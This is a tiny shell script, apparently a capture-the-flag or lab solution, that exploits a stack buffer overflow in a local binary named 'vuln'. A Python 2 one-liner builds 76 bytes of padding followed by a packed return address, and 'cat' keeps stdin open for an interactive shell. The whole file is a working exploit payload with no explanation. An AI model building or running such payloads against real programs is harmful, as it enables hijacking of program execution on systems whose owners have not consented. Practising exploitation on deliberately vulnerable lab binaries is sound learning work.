#!/bin/sh
(python -c 'import struct as s; print "A" * 0x4c + s.pack("<I", 0x080485e6)'; cat) | ./vuln
